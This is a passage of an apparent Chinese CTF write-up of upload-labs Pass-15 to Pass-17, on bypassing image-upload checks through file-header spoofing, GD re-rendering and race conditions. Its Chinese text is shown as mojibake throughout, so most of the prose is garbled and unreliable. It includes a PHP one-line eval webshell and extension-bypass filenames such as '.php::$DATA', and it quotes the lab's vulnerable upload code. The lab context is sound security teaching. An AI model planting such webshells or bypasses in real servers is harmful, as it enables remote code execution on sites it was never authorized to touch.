ä¸ªå­—èŠ‚ï¼‰ï¼Œè€Œä¸æ˜¯æ•´ä¸ªæ–‡ä»¶å†…å®¹ã€‚</li><li>è¿™ç§æ–¹å¼æ•ˆç‡è¾ƒé«˜ï¼Œå› ä¸ºå®ƒä¸éœ€è¦åŠ è½½æ•´ä¸ªæ–‡ä»¶ã€‚</li></ul></li><li><strong>æ£€æŸ¥æ–‡ä»¶ç­¾å</strong>ï¼š<ul><li>æ¯ç§å›¾åƒæ ¼å¼éƒ½æœ‰ç‹¬ç‰¹çš„æ–‡ä»¶ç­¾åã€‚ä¾‹å¦‚ï¼š<ul><li>JPEG æ–‡ä»¶çš„ç­¾åæ˜¯ <code>FF D8 FF</code>ã€‚</li><li>PNG æ–‡ä»¶çš„ç­¾åæ˜¯ <code>89 50 4E 47 0D 0A 1A 0A</code>ã€‚</li><li>GIF æ–‡ä»¶çš„ç­¾åæ˜¯ <code>47 49 46 38 39 61</code> æˆ– <code>47 49 46 38 37 61</code>ã€‚</li></ul></li><li>å‡½æ•°é€šè¿‡æ¯”å¯¹è¿™äº›ç­¾åæ¥ç¡®å®šæ–‡ä»¶ç±»å‹ã€‚</li></ul></li><li><strong>è¿”å›å€¼</strong>ï¼š<ul><li>å¦‚æœæ–‡ä»¶ç­¾ååŒ¹é…ï¼Œå‡½æ•°è¿”å›ä¸€ä¸ªæ•´æ•°å¸¸é‡ï¼Œè¡¨ç¤ºå›¾åƒç±»å‹ï¼ˆä¾‹å¦‚ <code>IMAGETYPE_JPEG</code>ã€<code>IMAGETYPE_PNG</code> ç­‰ï¼‰ã€‚</li><li>å¦‚æœæ–‡ä»¶ç­¾åä¸åŒ¹é…æˆ–æ–‡ä»¶æ— æ³•è¯»å–ï¼Œå‡½æ•°è¿”å› <code>false</code>ã€‚</li></ul></li></ol><p>æ³¨æ„äº‹é¡¹</p><ul><li><code>exif_imagetype()</code> æ— æ³•æ£€æµ‹æ²¡æœ‰ EXIF ä¿¡æ¯çš„å›¾åƒæ–‡ä»¶ï¼Œè¿™ç§æƒ…å†µä¸‹ä¼šè¿”å› <code>false</code>ã€‚</li><li>åœ¨æŸäº›æœåŠ¡å™¨ä¸Šï¼Œéœ€è¦å¯ç”¨ PHP çš„ <code>exif</code> æ‰©å±•æ‰èƒ½ä½¿ç”¨è¯¥å‡½æ•°ã€‚</li></ul></blockquote><p>è¿™ä¸ªå‡½æ•°è¯´åˆ°åº•è¿˜æ˜¯æ£€æµ‹æ–‡ä»¶å¤´çš„å‰å‡ ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆä¹‹å‰ä½¿ç”¨çš„yakit jpgå¤´éƒ¨æ ‡ç­¾ä¼°è®¡ä¹Ÿé€‚ç”¨è¿™ä¸€å…³ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.55.50.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.56.29.png" style="zoom:50%;"><p>æˆåŠŸgetshellã€‚</p><h1 id="åå…­ã€Pass-16-ï¼ˆäºŒæ¬¡æ¸²æŸ“ç»•è¿‡-gifã€pngã€jpgï¼‰"><a href="#åå…­ã€Pass-16-ï¼ˆäºŒæ¬¡æ¸²æŸ“ç»•è¿‡-gifã€pngã€jpgï¼‰" class="headerlink" title="åå…­ã€Pass-16**ï¼ˆäºŒæ¬¡æ¸²æŸ“ç»•è¿‡-gifã€pngã€jpgï¼‰"></a>åå…­ã€Pass-16**ï¼ˆäºŒæ¬¡æ¸²æŸ“ç»•è¿‡-gifã€pngã€jpgï¼‰</h1><h2 id="16-1-é¢˜é¢"><a href="#16-1-é¢˜é¢" class="headerlink" title="16.1 é¢˜é¢"></a>16.1 é¢˜é¢</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.59.48.png" style="zoom:40%;"><p>é¢˜é¢è¿˜æ˜¯ä¸€æ ·ã€‚</p><h2 id="16-2-ä»¥å¾€çš„å›¾ç‰‡æœ¨é©¬ä¸Šä¼ æ–¹æ³•å°è¯•"><a href="#16-2-ä»¥å¾€çš„å›¾ç‰‡æœ¨é©¬ä¸Šä¼ æ–¹æ³•å°è¯•" class="headerlink" title="16.2 ä»¥å¾€çš„å›¾ç‰‡æœ¨é©¬ä¸Šä¼ æ–¹æ³•å°è¯•"></a>16.2 ä»¥å¾€çš„å›¾ç‰‡æœ¨é©¬ä¸Šä¼ æ–¹æ³•å°è¯•</h2><ul><li>gifå›¾ç‰‡æœ¨é©¬</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2011.01.59.png" style="zoom:50%;"><p>ä»¥å¾€é€šè¿‡åŠ æ–‡ä»¶å¤´ä¸Šä¼ å›¾ç‰‡æœ¨é©¬çš„æ–¹æ³•è²Œä¼¼ä¸å¥æ•ˆäº†ã€‚</p><ul><li>jpgå›¾ç‰‡æœ¨é©¬</li></ul><p>ä½¿ç”¨ä¹‹å‰catå‘½ä»¤åˆ¶ä½œçš„å°¾éƒ¨å«æœ‰yjhæœ¨é©¬çš„å›¾ç‰‡æ–‡ä»¶ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC-7687822.jpeg" style="zoom:80%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2011.04.52.png" style="zoom:50%;"><p>ä¸Šä¼ å¤±è´¥ã€‚</p><p>ä¼ ç»Ÿè§‚å¿µçš„å›¾ç‰‡æœ¨é©¬çš„åˆ¶ä½œæ–¹æ³•è²Œä¼¼éƒ½å¤±æ•ˆäº†ã€‚</p><h2 id="16-3-ä»£ç å®¡è®¡"><a href="#16-3-ä»£ç å®¡è®¡" class="headerlink" title="16.3 ä»£ç å®¡è®¡"></a>16.3 ä»£ç å®¡è®¡</h2><ul><li>æç¤º</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2011.05.23.png" style="zoom:50%;"><p>è¿™å…³æ›´6ï¼Œç›´æ¥é‡æ–°æ¸²æŸ“å›¾ç‰‡äº†ï¼Œä¸»è¦ä½œç”¨å°±æ˜¯ç ´åå…¶ä¸­çš„æ¶æ„ä»£ç ï¼Œä½†æ˜¯ä¼°è®¡åº”è¯¥å­˜åœ¨æŸäº›ä½ç½®ï¼ˆå¯èƒ½æ˜¯å›¾ç‰‡æ ¼å¼çš„å‚æ•°å­—æ®µç­‰ï¼‰æ²¡æœ‰è¢«é‡æ–°æ¸²æŸ“ã€‚åœ¨è¿™äº›ä½ç½®å­˜åœ¨æ’å…¥æ¶æ„ä»£ç çš„å¯èƒ½ã€‚</p><ul><li>ä»£ç </li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$filetype</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$tmpname</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$target_path</span><span class="token operator">=</span><span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å</span>    <span class="token variable">$fileext</span><span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$fileext</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$filetype</span><span class="token operator">==</span><span class="token string double-quoted-string">"image/jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmpname</span><span class="token punctuation">,</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span>            <span class="token variable">$im</span> <span class="token operator">=</span> <span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$im</span> <span class="token operator">==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼"</span><span class="token punctuation">;</span>                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span>                <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$newfilename</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".jpg"</span><span class="token punctuation">;</span>                <span class="token comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span>                <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$newfilename</span><span class="token punctuation">;</span>                <span class="token function">imagejpeg</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ä¸Šä¼ å‡ºé”™ï¼"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$fileext</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"png"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$filetype</span><span class="token operator">==</span><span class="token string double-quoted-string">"image/png"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmpname</span><span class="token punctuation">,</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span>            <span class="token variable">$im</span> <span class="token operator">=</span> <span class="token function">imagecreatefrompng</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$im</span> <span class="token operator">==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼"</span><span class="token punctuation">;</span>                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                 <span class="token comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span>                <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$newfilename</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".png"</span><span class="token punctuation">;</span>                <span class="token comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span>                <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$newfilename</span><span class="token punctuation">;</span>                <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>                           <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ä¸Šä¼ å‡ºé”™ï¼"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$fileext</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"gif"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$filetype</span><span class="token operator">==</span><span class="token string double-quoted-string">"image/gif"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmpname</span><span class="token punctuation">,</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span>            <span class="token variable">$im</span> <span class="token operator">=</span> <span class="token function">imagecreatefromgif</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$im</span> <span class="token operator">==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼"</span><span class="token punctuation">;</span>                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span>                <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$newfilename</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".gif"</span><span class="token punctuation">;</span>                <span class="token comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span>                <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$newfilename</span><span class="token punctuation">;</span>                <span class="token function">imagegif</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ä¸Šä¼ å‡ºé”™ï¼"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>if(($fileext == "jpg") &amp;&amp; ($filetype=="image/jpeg")){</code>ä»è¿™è¡Œä»£ç å¯ä»¥çœ‹å‡ºï¼Œåç¼€åå’ŒMIMEç±»å‹å¿…é¡»éƒ½å¾—æ»¡è¶³æ¡ä»¶æ‰èƒ½è¿›å…¥åç»­é€»è¾‘ã€‚</p><p>ä¿®æ”¹<code>content-type</code>å’Œåç¼€åä½¿å¾—èƒ½è¿›å…¥åç»­é€»è¾‘ï¼š</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2011.15.42.png" style="zoom:50%;"><blockquote><h4 id="imagecreatefromgifå‡½æ•°"><a href="#imagecreatefromgifå‡½æ•°" class="headerlink" title="imagecreatefromgifå‡½æ•°"></a>imagecreatefromgifå‡½æ•°</h4><p><code>imagecreatefromgif()</code> æ˜¯ PHP ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œå±äº GD å›¾åƒåº“ï¼Œç”¨äºä» GIF æ–‡ä»¶ä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„å›¾åƒèµ„æºã€‚è¿™ä¸ªå‡½æ•°å¸¸ç”¨äºå›¾åƒå¤„ç†å’Œæ“ä½œï¼Œæ¯”å¦‚è£å‰ªã€ç¼©æ”¾ã€åˆå¹¶å›¾åƒç­‰ã€‚</p><h3 id="å‡½æ•°åŸå‹"><a href="#å‡½æ•°åŸå‹" class="headerlink" title="å‡½æ•°åŸå‹"></a>å‡½æ•°åŸå‹</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">resource <span class="token function">imagecreatefromgif</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>å‚æ•°</strong>ï¼š<ul><li><code>$filename</code>ï¼šGIF æ–‡ä»¶çš„è·¯å¾„ã€‚</li></ul></li><li><strong>è¿”å›å€¼</strong>ï¼š<ul><li>æˆåŠŸæ—¶è¿”å›ä¸€ä¸ªå›¾åƒèµ„æºï¼Œå¯ç”¨äºåç»­çš„å›¾åƒå¤„ç†ã€‚</li><li>å¦‚æœæ–‡ä»¶æ— æ³•åŠ è½½æˆ–ä¸æ˜¯æœ‰æ•ˆçš„ GIF å›¾åƒï¼Œè¿”å› <code>false</code>ã€‚</li></ul></li></ul></blockquote><h2 id="16-4-ç»•è¿‡GDåº“çš„æ€è·¯"><a href="#16-4-ç»•è¿‡GDåº“çš„æ€è·¯" class="headerlink" title="16.4 ç»•è¿‡GDåº“çš„æ€è·¯"></a>16.4 ç»•è¿‡GDåº“çš„æ€è·¯</h2><p>å°†ä¸€ä¸ªæ­£å¸¸æ˜¾ç¤ºçš„å›¾ç‰‡ï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨ã€‚å¯»æ‰¾å›¾ç‰‡è¢«æ¸²æŸ“åä¸åŸå§‹å›¾ç‰‡éƒ¨åˆ†å¯¹æ¯”ä»ç„¶ç›¸åŒçš„æ•°æ®å—éƒ¨åˆ†ï¼Œå°†Webshellä»£ç æ’åœ¨è¯¥éƒ¨åˆ†ï¼Œç„¶åä¸Šä¼ ã€‚</p><h2 id="16-5ã€Šæ–‡ä»¶ä¸Šä¼ æ¼æ´ä¹‹äºŒæ¬¡æ¸²æŸ“ç»•è¿‡ã€‹"><a href="#16-5ã€Šæ–‡ä»¶ä¸Šä¼ æ¼æ´ä¹‹äºŒæ¬¡æ¸²æŸ“ç»•è¿‡ã€‹" class="headerlink" title="16.5ã€Šæ–‡ä»¶ä¸Šä¼ æ¼æ´ä¹‹äºŒæ¬¡æ¸²æŸ“ç»•è¿‡ã€‹"></a>16.5ã€Šæ–‡ä»¶ä¸Šä¼ æ¼æ´ä¹‹äºŒæ¬¡æ¸²æŸ“ç»•è¿‡ã€‹</h2><p>åé¢çš„å†…å®¹å¤ªé•¿ï¼ŒæŠ½ç¦»å‡ºæ¥å†™åœ¨æœ¬ç«™ã€Šæ–‡ä»¶ä¸Šä¼ æ¼æ´ä¹‹äºŒæ¬¡æ¸²æŸ“ç»•è¿‡ã€‹ä¸€æ–‡ã€‚</p><h1 id="åä¸ƒã€Pass-17-ï¼ˆç™½åå•-æ¡ä»¶ç«äº‰ç»•è¿‡ï¼‰"><a href="#åä¸ƒã€Pass-17-ï¼ˆç™½åå•-æ¡ä»¶ç«äº‰ç»•è¿‡ï¼‰" class="headerlink" title="åä¸ƒã€Pass-17**ï¼ˆç™½åå•-æ¡ä»¶ç«äº‰ç»•è¿‡ï¼‰"></a>åä¸ƒã€Pass-17**ï¼ˆç™½åå•-æ¡ä»¶ç«äº‰ç»•è¿‡ï¼‰</h1><h2 id="17-1-é¢˜é¢"><a href="#17-1-é¢˜é¢" class="headerlink" title="17.1 é¢˜é¢"></a>17.1 é¢˜é¢</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-30%2010.50.55.png" style="zoom:50%;"><h2 id="17-2-è§£é¢˜"><a href="#17-2-è§£é¢˜" class="headerlink" title="17.2 è§£é¢˜"></a>17.2 è§£é¢˜</h2><ul><li>ä¸Šä¼ yjh.php</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sxk'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-30%2010.52.02.png" style="zoom:50%;"><p>ä¸Šä¼ å¤±è´¥ã€‚</p><p>æŠ“åŒ…ï¼š</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-30%2010.54.20.png" style="zoom:50%;"><ul><li>æ¢æµ‹æ£€æµ‹æ–¹æ³•</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-30%2010.55.03.png" style="zoom:50%;"><p>ä»…ä»…ä¿®æ”¹æ–‡ä»¶åå‘ç°èƒ½ä¸Šä¼ æˆåŠŸ=&gt;æ²¡æœ‰æ£€æµ‹æ–‡ä»¶å¤´&amp;&amp;æ²¡æœ‰æ£€æµ‹MIMEç±»å‹ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-30%2010.56.19.png" style="zoom:50%;"><p>è®¿é—®ä¸Šä¼ æˆåŠŸçš„å›¾ç‰‡ã€‚</p><p>ä½†æ˜¯è¿™æ ·çš„è¯éœ€è¦é…åˆè§£ææ¼æ´æ‰èƒ½è§£ææ‰§è¡Œæœ¨é©¬ã€‚</p><ul><li>å°è¯•åç¼€åç»•è¿‡</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-30%2010.58.28.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-30%2010.59.15.png" style="zoom:50%;"><p><code>.php.</code> <code>.phpç©ºæ ¼</code> <code>.php. .</code> <code>.php::$DATA</code> 